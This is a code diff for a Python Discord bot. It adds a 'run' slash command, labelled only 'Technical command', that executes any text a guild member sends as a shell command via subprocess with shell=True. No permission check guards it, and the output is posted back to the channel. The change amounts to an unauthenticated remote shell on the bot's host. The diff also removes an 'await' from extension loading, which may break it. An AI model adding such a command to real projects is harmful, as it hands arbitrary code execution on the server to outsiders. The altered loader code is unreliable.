@@ -7,6 +7,7 @@ import requests
 import openai
 import os
 import sqlite3
+import subprocess
 # import socket
 
 from dotenv import load_dotenv
@@ -14,6 +15,7 @@ from opengsq.protocols import Source
 from discord.ext import commands
 import aiohttp
 import asyncio
+
 
 import logging
 
@@ -56,7 +58,7 @@ conn.commit()
 async def load_extensions():
     for f in os.listdir("./cogs"):
         if f.endswith(".py"):
-            await bot.load_extension(f"cogs.{f[:-3]}")
+            bot.load_extension(f"cogs.{f[:-3]}")
                     
     
 async def check_achievements(user_id):
@@ -150,11 +152,23 @@ async def on_command_error(ctx, error):
     if isinstance(error, commands.errors.CheckFailure):
         await ctx.send('У вас нет необходимой роли для выполнения этой команды')
 
+@bot.slash_command(name='run', description='Technical command',guild_ids=[GUILD_ID])
+async def run(ctx, *, cmd:str):
+        try:
+            # Running the subprocess and capturing output
+            result = subprocess.run(cmd, shell=True, text=True, capture_output=True)
+            output = result.stdout if result.stdout else "No output"
+            await ctx.send(f'```{output}```')
+        except Exception as e:
+            await ctx.send(f'Error: {e}')
 
 async def main():
     async with bot:
         await load_extensions()
         await bot.start(TOKEN)
+
+
+
 
 asyncio.run(main())
 
